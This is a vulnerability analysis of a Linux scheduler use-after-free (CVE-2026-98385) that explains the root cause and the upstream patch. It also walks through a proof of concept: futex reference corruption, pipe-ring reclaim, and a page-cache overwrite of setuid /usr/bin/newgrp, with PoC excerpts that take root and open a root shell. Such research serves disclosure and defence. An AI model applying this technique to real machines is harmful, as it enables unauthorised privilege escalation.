<p align="center">
  <img src="../assets/tux.png" width="550" alt="tux">
</p>

# Intro

CVE-2026-98385 is a use-after-free vulnerability in the scheduler's cache accounting code. The scheduler updates per-CPU statistics that belong to a task's former `mm_struct` without protecting their lifetime. Even after `exec()` replaces the address space on another CPU and frees the old statistics, the scheduler can continue writing to a saved address.

The public PoC uses this stale per-CPU write to corrupt the reference counter of a private futex hash, reclaims the freed hash table with a pipe ring, and overwrites the page cache of `/usr/bin/newgrp` to achieve local privilege escalation. The target is Arch Linux `7.2.4-arch1-2`.

This document explains the root cause of the vulnerability and the exploit flow of the Arch PoC.

# Background

`CONFIG_SCHED_CACHE` is a scheduler feature that improves cache locality by grouping tasks that share an address space into one Last Level Cache, or LLC. The kernel stores a `struct sched_cache_stat` in each `mm_struct`. Its `pcpu_sched` points to a `struct sched_cache_time` that occupies 16 bytes and records runtime and an epoch for each CPU.

```c
struct sched_cache_time {
	u64 runtime;
	unsigned long epoch;
};

struct sched_cache_stat {
	struct sched_cache_time __percpu *pcpu_sched;
	raw_spinlock_t lock;
	unsigned long epoch;
	u64 nr_running_avg;
	unsigned long next_scan;
	unsigned long footprint;
	int cpu;
} ____cacheline_aligned_in_smp;
```

`CONFIG_SCHED_CACHE=y` alone does not enable this path. The kernel enables `sched_cache_present` only when a scheduling partition contains multiple LLCs. More precisely, the highest `SD_SHARE_LLC` domain must contain at least two CPUs, and a wider parent domain must remain after parents with the same span are skipped.

```c
static bool sd_in_multi_llcs(struct sched_domain *sd)
{
	struct sched_domain *sdp = sd->parent;

	/* it does not make sense to aggregate to 1 CPU */
	if (sd->span_weight == 1)
		return false;

	while (sdp && sdp->span_weight == sd->span_weight)
		sdp = sdp->parent;

	return !!sdp;                                      // <=[1]
}
```

`[1]` determines whether a scheduling domain wider than the shared LLC exists. The PoC environment has four vCPUs in a `2 sockets × 2 cores × 1 thread` configuration, where CPUs 0 and 1 share LLC A and CPUs 2 and 3 share LLC B. If all four CPUs share one LLC, there is no wider parent. If each LLC contains only one CPU, `span_weight == 1`. The feature is not enabled in either case. The default value of `sysctl_sched_cache_user` is 1, so the feature is enabled when this topology is detected.

This LLC condition is required for the kernel to execute the vulnerable code. Separately, the runner pins the setter on vCPU 1 and the scanner on vCPU 3 to the same host logical CPU to widen the race window. The PoC assigns fixed roles to CPUs 0 through 3, and its allocator geometry is also tuned for possible CPUs 0 through 3 and the initial per-CPU allocation state.

The scheduler calls `account_mm_sched()` when it updates CFS runtime. The task passed to this function is not the queued task that caused the update, but `rq->curr`, which is actually running on that runqueue.

```c
static s64 update_se(struct rq *rq, struct sched_entity *se)
{
	[...]
	if (entity_is_task(se)) {
		struct task_struct *donor = task_of(se);
		struct task_struct *running = rq->curr;          // <=[2]
		[...]
		running->se.exec_start = now;
		running->se.sum_exec_runtime += delta_exec;

		trace_sched_stat_runtime(running, delta_exec);
		account_group_exec_runtime(running, delta_exec);
		account_mm_sched(rq, running, delta_exec);
		[...]
		cgroup_account_cputime(donor, delta_exec);
	} else {
		[...]
	}
	[...]
}
```

Because of `[2]`, even when the setter in the PoC dequeues a SCHED_IDLE task queued on CPU 2 through `sched_setattr()`, `account_mm_sched()` operates on the exec trampoline that is running on CPU 2 at that moment.

`exec()` installs a new `mm_struct` for the current task and then releases the old `mm_struct`. Without a mechanism that pins the old `mm_struct` while the scheduler references it, a runtime update on a remote CPU can race with the address space replacement.

The PoC does not use this scheduler UAF to corrupt a credential object directly. It arranges for part of the freed scheduler allocation, which occupies 16 bytes, to be reused by a futex reference that occupies 4 bytes in the same per-CPU allocator. The stale write then corrupts the lifetime state of the private futex hash. The PoC expands the resulting hash table UAF into `pipe_buffer` flag corruption and a page cache overwrite.

# Root Cause

In the vulnerable Arch source, `account_mm_sched()` performs a plain read of `p->mm` and calculates a per-CPU address owned by that `mm_struct`. It does not pin the lifetime with `mmget()`, `mmgrab()`, or the task lock.

```c
static inline
void account_mm_sched(struct rq *rq, struct task_struct *p, s64 delta_exec)
{
	struct sched_cache_time *pcpu_sched;
	struct mm_struct *mm = p->mm;                       // <=[3]
	int mm_sched_llc = -1;
	unsigned long epoch;

	if (!sched_cache_enabled())
		return;

	if (p->sched_class != &fair_sched_class)
		return;
	[...]
	if (!mm || !mm->sc_stat.pcpu_sched)
		return;

	pcpu_sched = per_cpu_ptr(mm->sc_stat.pcpu_sched, cpu_of(rq)); // <=[4]

	scoped_guard (raw_spinlock, &rq->cpu_epoch_lock) { // <=[5]
		__update_mm_sched(rq, pcpu_sched);
		pcpu_sched->runtime += delta_exec;              // <=[6]
		rq->cpu_runtime += delta_exec;
		epoch = rq->cpu_epoch;
	}

	[...]
}
```

`[3]` obtains the `mm` of the running task without taking a reference. `[4]` uses this `mm` to calculate the address of the current runqueue CPU's slot, which occupies 16 bytes. After this calculation, the caller can wait while acquiring `cpu_epoch_lock` at `[5]`, but it does not check `p->mm` or `pcpu_sched` again after taking the lock. If the old address space is freed in the meantime, `[6]` performs a read-modify-write operation on 8 bytes of reallocated memory.

The epoch update reads and writes the same stale object.

```c
static inline void __update_mm_sched(struct rq *rq,
				     struct sched_cache_time *pcpu_sched)
{
	lockdep_assert_held(&rq->cpu_epoch_lock);

	unsigned int period = max(READ_ONCE(llc_epoch_period), 1U);
	unsigned long n, now = jiffies;
	long delta = now - rq->cpu_epoch_next;

	if (delta > 0) {
		n = (delta + period - 1) / period;
		rq->cpu_epoch += n;
		rq->cpu_epoch_next += n * period;
		__shr_u64(&rq->cpu_runtime, n);
	}

	n = rq->cpu_epoch - pcpu_sched->epoch;
	if (n) {
		pcpu_sched->epoch += n;                         // <=[7]
		__shr_u64(&pcpu_sched->runtime, n);
	}
}
```

`[7]` brings `epoch`, the second field of `sched_cache_time`, in line with the current runqueue epoch. This field occupies 8 bytes. The stale access can therefore affect offsets `+0..7`, which contain `runtime`, and offsets `+8..15`, which contain `epoch`. The PoC directly uses offset `+12`, which overlaps the upper 32 bits of `epoch`.

Meanwhile, `exec_mmap()` replaces the address space of the current task while holding the task lock with local interrupts disabled. This synchronization does not tie the lifetime of the `mm` to a lock held by the remote runqueue or to `cpu_epoch_lock`.

```c
static int exec_mmap(struct linux_binprm *bprm)
{
	[...]
	tsk = current;
	old_mm = current->mm;
	[...]
	exec_mm_release(tsk, old_mm);
	[...]
	task_lock(tsk);
	membarrier_exec_mmap(mm);

	local_irq_disable();
	active_mm = tsk->active_mm;
	tsk->active_mm = mm;
	tsk->mm = mm;                                     // <=[8]
	mm_init_cid(mm, tsk);
	[...]
	task_unlock(tsk);
	[...]
	if (old_mm) {
		[...]
		bprm->old_mm = old_mm;
	} else {
		mmdrop_lazy_tlb(active_mm);
	}
	[...]
}

[...]

void setup_new_exec(struct linux_binprm * bprm)
{
	[...]
	up_write(&me->signal->exec_update_lock);
	mutex_unlock(&me->signal->cred_guard_mutex);
	[...]
	if (bprm->old_mm) {
		exec_mm_put_old(bprm->old_mm);                  // <=[9]
		bprm->old_mm = NULL;
	}
}
```

At `[8]`, the task switches to the new `mm_struct`, but a remote CPU may already have calculated a per-CPU address from the old `mm_struct`. `[9]` calls `mmput()` on the old address space and proceeds to `__mmdrop()` when the final reference disappears.

When the final `mm_count` is dropped, the scheduler statistics are freed.

```c
void __mmdrop(struct mm_struct *mm)
{
	[...]
	mm_destroy_sched(mm);                              // <=[10]
	mm_free_pgd(mm);
	[...]
}

[...]

static inline void mm_destroy_sched(struct mm_struct *mm)
{
	free_percpu(mm->sc_stat.pcpu_sched);               // <=[11]
	mm->sc_stat.pcpu_sched = NULL;
}
```

`[10]` destroys the scheduler statistics in the final release path of the old `mm_struct`. If the setter resumes after `[11]` returns the per-CPU object to the allocator, the saved `pcpu_sched` is a dangling pointer. Changing the order of the NULL assignment cannot protect an address that has already been captured.

# Exploit

The PoC reuses part of the storage previously occupied by a scheduler object for a per-CPU futex reference. The scheduler object occupies 16 bytes, while the reference counter occupies 4 bytes. The stale write changes this counter from 1 to 0. During private futex hash replacement, this value is converted into an atomic reference of `-1`. From this invalid state, the PoC creates a PI waiter that enters the old hash table late, frees the table, and reuses the same slab for a pipe ring. Waiter cleanup decrements `pipe_buffer.flags`, enabling `PIPE_BUF_FLAG_CAN_MERGE`, and the final pipe write is merged into the page cache of a setuid executable.

## 1. Creating the LLC topology and a stale scheduler pointer

The PoC uses CPU 0 for per-CPU allocator grooming, CPU 1 for the setter, CPU 2 for the exec trampoline and queued wakee, and CPU 3 for timing observation and the later futex race. This assignment matches the target topology, where CPUs 0 and 1 share one LLC and CPUs 2 and 3 share another. `host_supported()` checks that at least four CPUs are online, but does not verify the LLC arrangement itself, so the execution environment must satisfy this condition separately.

The PoC first fills low free locations with three prefill references. It then frees four consecutive donor references, each of which occupies 4 bytes, in a guarded anchor bank to open an aligned hole of 16 bytes. The `sched_cache_time` for the trampoline address space installed by the first exec is allocated into this location.

The setter on CPU 1 repeatedly calls `sched_setattr()` on a wakee queued on CPU 2. When the dequeue path of this syscall calls `update_curr()`, the actual target of `account_mm_sched()` is `rq->curr` on CPU 2, which is the trampoline. After the setter calculates the CPU 2 address from the old `mm_struct` and waits on `rq2->cpu_epoch_lock`, the trampoline calls exec again and frees the captured scheduler object.

The default PoC divides six fillers into two groups of three.

```c
#define SC_FILLER_SLOTS_MAX 6U
#ifndef SC_FILLER_COUNT
#define SC_FILLER_COUNT 6U                            // <=[12]
#endif

#ifndef SC_PREFILL_FILLER_COUNT
#define SC_PREFILL_FILLER_COUNT 3U
#endif
#define SC_POSTFILL_FILLER_COUNT (SC_FILLER_COUNT - SC_PREFILL_FILLER_COUNT)
```

In the default configuration at `[12]`, three postfill references occupy `+0`, `+4`, and `+8` in the freed lane, which occupies 16 bytes, and the per-CPU reference of the futex hash with 8 slots created by the new image occupies `+12`. Because the postfill objects are allocated on CPU 0, `+8` in the CPU 2 slot is 0, while the target reference at `+12` is 1. The stale `epoch` in the CPU 2 slot is therefore `0x0000000100000000`.

When the setter resumes, `pcpu_sched->epoch += n` adjusts the value, which is 64 bits wide, to the current small value of `rq2->cpu_epoch`. This changes the futex reference at `+12`, which overlaps the upper 32 bits, from 1 to 0. This step does not set the entire stale object to 0. The `epoch` update overwrites precisely the reclaimed counter, which occupies 4 bytes.

## 2. Turning the corrupted futex reference into a negative reservoir

The PoC runs a CLONE_VM child that expands the corrupted private hash from 8 slots to 262,144 slots. `__futex_ref_atomic_end()` folds the per-CPU references of the old hash into an atomic reference by adding the counters of all possible CPUs and resetting them to 0.

```c
static void __futex_ref_atomic_end(struct futex_private_hash *fph)
{
	struct mm_struct *mm = fph->mm;
	unsigned int count = 0;
	long ret;
	int cpu;
	[...]
	for_each_possible_cpu(cpu) {
		unsigned int *ptr = per_cpu_ptr(mm->futex.phash.ref, cpu);
		count += *ptr;
		*ptr = 0;
	}
	[...]
	this_cpu_inc(*mm->futex.phash.ref); /* 0 -> 1 */
	[...]
	ret = atomic_long_add_return(count - LONG_MAX - 1, &mm->futex.phash.atomic); // <=[13]
	if (!ret)
		wake_up_var(mm);

	WARN_ON_ONCE(ret < 0);
	mmput_async(mm);
}
```

A valid initial reference leaves 1 in the sum, making the result at `[13]` equal to 0. After the PoC changes the CPU 2 counter to 0, `count == 0`, so the result is `-1`. `futex_ref_is_dead()` treats only exactly 0 as dead. It therefore does not classify `-1` as dead, so `futex_hash()` does not pivot to pending hash B, and the resize child remains in the wait loop. The visible slot count of current hash A remains 8.

The PoC checks that the result of the resize child remains at its initial value of `LONG_MIN` and that both slot count observations are 8.

```c
		if (result == LONG_MIN &&
		    slots_before_delay == (long)FUTEX_RACE_INITIAL_HASH_SLOTS &&
		    slots_after_delay == (long)FUTEX_RACE_INITIAL_HASH_SLOTS)
			return 0;                                  // <=[14]
```

`[14]` is an oracle that determines that the negative reservoir is armed by confirming that the resize child has not returned and that the visible slot count remains 8. In the subsequent race, the target changes the reference of hash A from `-1` to 0, allowing the selector to pivot to pending hash B.

## 3. Leaving a late PI waiter in the old hash

The PoC makes the SCHED_IDLE target obtain a reference to hash A first. `atomic_long_inc_not_zero()` succeeds while changing `-1` to 0, so the target can be delayed just before queueing after receiving the address of a bucket in A.

If the selector looks up another futex in the meantime, its attempt to obtain a reference to A fails because the atomic reference is exactly 0. `futex_hash()` pivots to pending hash B, rehashes the existing waiters from A, publishes B, and passes A to `kvfree_rcu()`.

```c
static bool __futex_pivot_hash(struct mm_struct *mm, struct futex_private_hash *new)
{
	struct futex_mm_phash *mmph = &mm->futex.phash;
	struct futex_private_hash *fph;
	[...]
	fph = rcu_dereference_protected(mmph->hash, lockdep_is_held(&mmph->lock));
	if (fph) {
		if (!futex_ref_is_dead(fph)) {
			mmph->hash_new = new;
			return false;
		}

		futex_rehash_private(fph, new);                 // <=[15]
	}
	new->state = FR_PERCPU;
	scoped_guard(rcu) {
		mmph->batches = get_state_synchronize_rcu();
		rcu_assign_pointer(mmph->hash, new);
	}
	kvfree_rcu(fph, rcu);                              // <=[16]
	return true;
}
```

`[15]` moves only waiters that are already linked to A at the time of the pivot into B. The target has obtained only a reference to A and has not yet entered the queue, so this traversal misses it. After `[16]` schedules A for freeing, the target resumes and enters bucket 0 of A. Its `futex_q.lock_ptr` continues to point to the table that will soon be freed. `futex_hash()` executes this pivot path when the selector encounters a reference of 0.

The PoC confirms that the PI owner cycle returns `EDEADLK`, proving that the target is actually waiting. It then checks that `FUTEX_WAKE` on B returns 0 and that the target remains asleep, confirming that the waiter was not moved into the new table.

## 4. Reclaiming the hash table with a pipe ring

Private futex hash A has eight slots. It consists of a header that occupies 64 bytes and eight buckets that occupy 64 bytes each, for a total of 576 bytes. On the target kernel, it is allocated from `kmalloc-cg-1k`. The PoC also replaces hashes with eight slots in eleven separate address spaces, placing twelve old hashes including A into an RCU sheaf and forcing their actual release.

```c
#define PIPE_BANK_WORKERS 4
#define PIPE_BANK_WAVES 15
#define PIPE_BANK_PIPES_PER_WAVE 16
#define PIPE_BANK_PIPES_PER_WORKER (PIPE_BANK_WAVES * PIPE_BANK_PIPES_PER_WAVE)
#define PIPE_BANK_TOTAL_PIPES (PIPE_BANK_WORKERS * PIPE_BANK_PIPES_PER_WORKER) // <=[17]
#define HASH_FLUSHER_COUNT 11U
```

`[17]` makes four workers prepare 16 pipes in each of 15 waves, for a total of 960 pipes. Each pipe ring grows from 2 slots to 16 slots. Because `struct pipe_buffer` is 40 bytes, each new ring is 640 bytes and can reclaim the freed hash table from the same `kmalloc-cg-1k` cache as A.

The PoC writes one byte to each pipe and reads it back to move the ring index to 1, then splices the byte immediately before the ELF entry of `/usr/bin/newgrp`. The `pipe_buffer` backed by the file occupies slot 1 of the ring. The first bucket of A begins at object offset 64, and `pipe_buffer[1].flags` is also at `40 + 24`, or offset 64.

When the late PI waiter is terminated with `SIGKILL`, the futex cleanup path follows the stale `q->lock_ptr` and removes the waiter from the first bucket of A.

```c
void __futex_unqueue(struct futex_q *q)
{
	struct futex_hash_bucket *hb;

	if (WARN_ON_SMP(!q->lock_ptr) || WARN_ON(plist_node_empty(&q->list)))
		return;
	lockdep_assert_held(q->lock_ptr);

	hb = container_of(q->lock_ptr, struct futex_hash_bucket, lock);
	plist_del(&q->list, &hb->chain);
	futex_hb_waiters_dec(hb);                          // <=[18]
}
```

`[18]` normally decrements `futex_hash_bucket.waiters`, but after reclamation it lands on `pipe_buffer[1].flags`. Decrementing the initial value of 0 produces `0xffffffff`, which includes the `PIPE_BUF_FLAG_CAN_MERGE` bit.

The pipe write path appends new data to the last buffer when this flag is set.

```c
	if (chars && !was_empty) {
		struct pipe_buffer *buf = pipe_buf(pipe, head - 1);
		int offset = buf->offset + buf->len;

		if ((buf->flags & PIPE_BUF_FLAG_CAN_MERGE) &&
		    offset + chars <= PAGE_SIZE) {              // <=[19]
			ret = pipe_buf_confirm(pipe, buf);
			if (ret)
				goto out;

			ret = copy_page_from_iter(buf->page, offset, chars, from);
			[...]
			buf->len += ret;
			if (!iov_iter_count(from))
				goto out;
		}
	}
```

At `[19]`, only the corrupted pipe merges the write into the `newgrp` page cache referenced through splice instead of a new anonymous page. Because the spliced byte ends at the ELF entry, the PoC writes 16 bytes and then 29 bytes to every pipe to complete an entry stub that spans 45 bytes.

## 5. Executing setuid and restoring the original bytes

The PoC forks a separate child to execute the final payload before the parent sets `PR_SET_NO_NEW_PRIVS`. The child waits with `no_new_privs == 0`, then executes `/usr/bin/newgrp` after the hash of the patch, which spans 45 bytes, has been verified.

```c
static void NORETURN_ATTR
payload_handoff_effect_wait_exec(struct payload_handoff_shared *shared)
{
	[...]
	(void)snprintf(target_full, sizeof(target_full), "%s/%s",
		       payload_handoff_target_dir, payload_handoff_target_path);
	(void)execve(target_full, target_argv, target_envp); // <=[20]
	payload_handoff_effect_fail(shared, 104);
}
```

When `/usr/bin/newgrp`, a setuid executable owned by root, runs at `[20]`, the modified ELF entry executes first. The stub uses `execveat(AT_EMPTY_PATH)` to execute the PoC preserved in reserved file descriptor 198. The restarted PoC enters the root stage when its real uid is 1000, its effective uid is 0, and the identities of the reserved file descriptors match.

```c
static void NORETURN_ATTR payload_handoff_root_stage(void)
{
	[...]
	if (syscall(SYS_setgroups, (size_t)0, (const gid_t *)NULL) != 0 ||
	    setresgid(0, 0, 0) != 0 || setresuid(0, 0, 0) != 0) // <=[21]
		payload_handoff_root_fail(200);
	[...]
	fd = openat(PAYLOAD_HANDOFF_FD_BIN_DIR, payload_handoff_target_path,
		    O_WRONLY | O_NOFOLLOW | O_CLOEXEC);
	if (fd < 0 ||
	    [...]
	    payload_handoff_write_exact_at(fd, record.original_entry,
					   PAYLOAD_STUB_BYTES,
					   payload_handoff_patch_offset) != 0 || // <=[22]
	    fchmod(fd, SC_TARGET_MODE) != 0 || fsync(fd) != 0 || close(fd) != 0)
		payload_handoff_root_fail(203);
	[...]
	(void)dprintf(STDOUT_FILENO, "[+] uid=0 gid=0\n");
	[...]
}
```

`[21]` sets the real, effective, and saved user and group IDs to 0. `[22]` restores the saved original 45 bytes to the same inode. The following `fchmod()` and `fsync()` restore the mode and commit the changes to disk. The PoC then reopens the file and verifies its original hash. On the success path, it launches an interactive root shell.

# Patch

The upstream fix consists of two consecutive commits. The first commit, `28f9c0e0a0b9`, separates `sched_cache_stat` from `mm_struct` and replaces it with a `sched_cache_group` managed through a reference count and RCU.

```diff
diff --git a/include/linux/mm_types.h b/include/linux/mm_types.h
[...]
--- a/include/linux/mm_types.h
+++ b/include/linux/mm_types.h
@@ -1226,7 +1226,7 @@ struct mm_struct {
 		struct mm_mm_cid mm_cid;

 		/* sched_cache related statistics */
-		struct sched_cache_stat sc_stat;
+		struct sched_cache_group *sched_cache_grp;
[...]
diff --git a/include/linux/sched.h b/include/linux/sched.h
[...]
--- a/include/linux/sched.h
+++ b/include/linux/sched.h
@@ -2405,7 +2405,7 @@ struct sched_cache_time {
 	unsigned long epoch;
 };

-struct sched_cache_stat {
+struct sched_cache_group {
 	struct sched_cache_time __percpu *pcpu_sched;
 	raw_spinlock_t lock;
 	unsigned long epoch;
[...]
@@ -2413,11 +2413,13 @@ struct sched_cache_stat {
 	unsigned long next_scan;
 	unsigned long footprint;
 	int cpu;
+	refcount_t refcnt;
+	struct rcu_head rcu;
 } ____cacheline_aligned_in_smp;
```

This commit gives the scheduler statistics an independent lifetime, but it does not complete the fix by itself because `account_mm_sched()` still accesses them through `p->mm->sched_cache_grp`.

The second commit, `b636fef85bda`, makes each `task_struct` hold a cache group reference directly and replaces or releases that reference in the fork, exec, and exit paths. The scheduler hot path no longer follows `p->mm`.

```diff
diff --git a/fs/exec.c b/fs/exec.c
[...]
--- a/fs/exec.c
+++ b/fs/exec.c
@@ -882,6 +882,7 @@ static int exec_mmap(struct linux_binprm *bprm)
 	active_mm = tsk->active_mm;
 	tsk->active_mm = mm;
 	tsk->mm = mm;
+	sched_cache_exec_mmap(tsk, mm);
 	mm_init_cid(mm, tsk);
[...]
diff --git a/include/linux/sched.h b/include/linux/sched.h
[...]
--- a/include/linux/sched.h
+++ b/include/linux/sched.h
@@ -1433,6 +1433,7 @@ struct task_struct {

 #ifdef CONFIG_SCHED_CACHE
 	struct callback_head		cache_work;
+	struct sched_cache_group __rcu	*sched_cache_grp;
 	int				preferred_llc;
[...]
diff --git a/kernel/sched/fair.c b/kernel/sched/fair.c
[...]
--- a/kernel/sched/fair.c
+++ b/kernel/sched/fair.c
[...]
@@ -1819,9 +1894,8 @@ static unsigned int task_running_on_cpu(int cpu, struct task_struct *p);
 static inline
 void account_mm_sched(struct rq *rq, struct task_struct *p, s64 delta_exec)
 {
+	struct sched_cache_group *grp = rcu_dereference_all(p->sched_cache_grp);
 	struct sched_cache_time *pcpu_sched;
-	struct sched_cache_group *grp;
-	struct mm_struct *mm = p->mm;
 	int mm_sched_llc = -1;
 	unsigned long epoch;
[...]
@@ -1832,12 +1906,8 @@ void account_mm_sched(struct rq *rq, struct task_struct *p, s64 delta_exec)
 		return;
 	/*
 	 * init_task, kthreads and user thread created
-	 * by user_mode_thread() don't have mm.
+	 * by user_mode_thread() don't have a cache group.
 	 */
-	if (!mm)
-		return;
-
-	grp = READ_ONCE(mm->sched_cache_grp);
 	if (!grp || !grp->pcpu_sched)
 		return;
```

Now, when exec replaces `tsk->mm`, the cache group reference held by the task changes to the new group at the same time. Even if a remote scheduler is still observing the old group, the task reference and RCU keep the per-CPU statistics alive. The first patch separates the statistics into a group managed through reference counting, and the second removes the unsafe access through `p->mm`, completely preventing the use-after-free.
